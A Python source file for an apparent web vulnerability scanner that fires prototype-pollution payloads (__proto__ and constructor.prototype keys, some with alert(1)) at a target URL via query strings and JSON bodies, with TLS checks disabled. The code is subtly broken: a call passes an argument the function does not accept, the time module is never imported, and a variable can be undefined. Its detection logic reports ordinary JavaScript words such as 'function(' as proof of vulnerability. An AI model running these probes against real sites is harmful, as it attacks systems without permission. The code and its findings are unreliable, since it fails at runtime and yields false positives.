import requests
import json
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode

class PrototypePollutionScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "DEEP_SCAN": False,
            "PAYLOAD_SOURCE": "url",
            "TEST_JSON": False,
            "CUSTOM_PAYLOAD": ""
        }
        
        self.payloads = [
            "__proto__.polluted=polluted",
            "constructor.prototype.polluted=polluted",
            "__proto__[polluted]=polluted",
            "constructor.prototype[polluted]=polluted",
            "__proto__.toString=polluted",
            "constructor.prototype.toString=polluted",
            "__proto__.valueOf=polluted",
            "constructor.prototype.valueOf=polluted",
            "__proto__.hasOwnProperty=polluted",
            "constructor.prototype.hasOwnProperty=polluted",
            "__proto__.isPrototypeOf=polluted",
            "constructor.prototype.isPrototypeOf=polluted",
            "__proto__.propertyIsEnumerable=polluted",
            "constructor.prototype.propertyIsEnumerable=polluted",
            "__proto__.toLocaleString=polluted",
            "constructor.prototype.toLocaleString=polluted"
        ]
        
        self.json_payloads = [
            '{"__proto__":{"polluted":"polluted"}}',
            '{"constructor":{"prototype":{"polluted":"polluted"}}}',
            '{"__proto__":{"toString":"polluted"}}',
            '{"constructor":{"prototype":{"toString":"polluted"}}}',
            '{"__proto__":{"valueOf":"polluted"}}',
            '{"constructor":{"prototype":{"valueOf":"polluted"}}}',
            '{"__proto__":{"hasOwnProperty":"polluted"}}',
            '{"constructor":{"prototype":{"hasOwnProperty":"polluted"}}}',
            '{"__proto__":{"isPrototypeOf":"polluted"}}',
            '{"constructor":{"prototype":{"isPrototypeOf":"polluted"}}}',
            '{"__proto__":{"propertyIsEnumerable":"polluted"}}',
            '{"constructor":{"prototype":{"propertyIsEnumerable":"polluted"}}}',
            '{"__proto__":{"toLocaleString":"polluted"}}',
            '{"constructor":{"prototype":{"toLocaleString":"polluted"}}}'
        ]
        
        self.detection_payloads = [
            "__proto__.polluted=alert(1)",
            "constructor.prototype.polluted=alert(1)",
            "__proto__[polluted]=alert(1)",
            "constructor.prototype[polluted]=alert(1)",
            "__proto__.toString=alert(1)",
            "constructor.prototype.toString=alert(1)",
            "__proto__.valueOf=alert(1)",
            "constructor.prototype.valueOf=alert(1)",
            "__proto__.hasOwnProperty=alert(1)",
            "constructor.prototype.hasOwnProperty=alert(1)",
            "__proto__.isPrototypeOf=alert(1)",
            "constructor.prototype.isPrototypeOf=alert(1)",
            "__proto__.propertyIsEnumerable=alert(1)",
            "constructor.prototype.propertyIsEnumerable=alert(1)",
            "__proto__.toLocaleString=alert(1)",
            "constructor.prototype.toLocaleString=alert(1)"
        ]
        
        self.json_detection_payloads = [
            '{"__proto__":{"polluted":"alert(1)"}}',
            '{"constructor":{"prototype":{"polluted":"alert(1)"}}}',
            '{"__proto__":{"toString":"alert(1)"}}',
            '{"constructor":{"prototype":{"toString":"alert(1)"}}}',
            '{"__proto__":{"valueOf":"alert(1)"}}',
            '{"constructor":{"prototype":{"valueOf":"alert(1)"}}}',
            '{"__proto__":{"hasOwnProperty":"alert(1)"}}',
            '{"constructor":{"prototype":{"hasOwnProperty":"alert(1)"}}}',
            '{"__proto__":{"isPrototypeOf":"alert(1)"}}',
            '{"constructor":{"prototype":{"isPrototypeOf":"alert(1)"}}}',
            '{"__proto__":{"propertyIsEnumerable":"alert(1)"}}',
            '{"constructor":{"prototype":{"propertyIsEnumerable":"alert(1)"}}}',
            '{"__proto__":{"toLocaleString":"alert(1)"}}',
            '{"constructor":{"prototype":{"toLocaleString":"alert(1)"}}}'
        ]
        
        self.indicators = [
            "polluted",
            "alert(1)",
            "CONSOLE.LOG",
            "PROCESS.EXIT",
            "CHILD_PROCESS",
            "FS.READFILE",
            "EVAL(",
            "FUNCTION(",
            "SETTIMEOUT",
            "SETINTERVAL"
        ]
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def run(self):
        url = self.get_option("URL")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Cookie": self.get_option("COOKIE")
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        vulnerabilities = []
        
        if self.get_option("CUSTOM_PAYLOAD"):
            custom_payloads = [self.get_option("CUSTOM_PAYLOAD")]
            vulnerabilities.extend(self.test_payloads(url, method, timeout, delay, headers, custom_payloads, "url"))
        
        if self.get_option("PAYLOAD_SOURCE") == "url" or self.get_option("DEEP_SCAN"):
            vulnerabilities.extend(self.test_payloads(url, method, timeout, delay, headers, self.payloads, "url"))
        
        if self.get_option("TEST_JSON") or self.get_option("DEEP_SCAN"):
            vulnerabilities.extend(self.test_payloads(url, method, timeout, delay, headers, self.json_payloads, "json"))
        
        if self.get_option("DEEP_SCAN"):
            vulnerabilities.extend(self.test_payloads(url, method, timeout, delay, headers, self.detection_payloads, "url"))
            vulnerabilities.extend(self.test_payloads(url, method, timeout, delay, headers, self.json_detection_payloads, "json"))
        
        if vulnerabilities:
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} potential prototype pollution vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            return {
                "success": True,
                "message": "No prototype pollution vulnerabilities detected"
            }
    
    def test_payloads(self, url, method, timeout, delay, payloads, payload_type):
        vulnerabilities = []
        
        for i, payload in enumerate(payloads, 1):
            if delay > 0:
                time.sleep(delay)
            
            vulnerable, vuln_type = self.test_payload(url, method, timeout, payload, payload_type)
            
            if vulnerable:
                vulnerabilities.append({
                    "payload": payload,
                    "type": vuln_type,
                    "payload_type": payload_type
                })
        
        return vulnerabilities
    
    def test_payload(self, url, method, timeout, payload, payload_type):
        try:
            headers = {
                "User-Agent": self.get_option("USER_AGENT"),
                "Cookie": self.get_option("COOKIE")
            }
            
            if self.get_option("HEADERS"):
                try:
                    for header in self.get_option("HEADERS").split("\\n"):
                        if ":" in header:
                            key, value = header.split(":", 1)
                            headers[key.strip()] = value.strip()
                except:
                    pass
            
            if payload_type == "url":
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                if query_params:
                    first_param = list(query_params.keys())[0]
                    query_params[first_param] = [payload]
                else:
                    query_params = {"test": [payload]}
                
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                
                if method == "GET":
                    response = requests.get(test_url, timeout=timeout, verify=False, headers=headers)
                else:
                    response = requests.post(url, data={first_param: payload}, timeout=timeout, verify=False, headers=headers)
            
            elif payload_type == "json":
                json_data = json.loads(payload)
                headers["Content-Type"] = "application/json"
                
                if method == "GET":
                    response = requests.get(url, params=json_data, timeout=timeout, verify=False, headers=headers)
                else:
                    response = requests.post(url, json=json_data, timeout=timeout, verify=False, headers=headers)
            
            for indicator in self.indicators:
                if indicator.lower() in response.text.lower():
                    return True, f"Prototype Pollution ({indicator} detected)"
            
            if "polluted" in response.text.lower():
                return True, "Prototype Pollution (polluted property detected)"
            
            if "alert(1)" in response.text.lower():
                return True, "Prototype Pollution (XSS vector detected)"
            
            if "CONSOLE.LOG" in response.text.upper():
                return True, "Prototype Pollution (Console command detected)"
            
            if "PROCESS.EXIT" in response.text.upper():
                return True, "Prototype Pollution (Process manipulation detected)"
            
            if "CHILD_PROCESS" in response.text.upper():
                return True, "Prototype Pollution (Child process detected)"
            
            if "FS.READFILE" in response.text.upper():
                return True, "Prototype Pollution (File system access detected)"
            
            if "EVAL(" in response.text.upper():
                return True, "Prototype Pollution (Code execution detected)"
            
            if "FUNCTION(" in response.text.upper():
                return True, "Prototype Pollution (Dynamic function creation detected)"
            
            if "SETTIMEOUT" in response.text.upper():
                return True, "Prototype Pollution (Timer manipulation detected)"
            
            if "SETINTERVAL" in response.text.upper():
                return True, "Prototype Pollution (Interval manipulation detected)"
            
        except Exception:
            pass
        
        return False, None
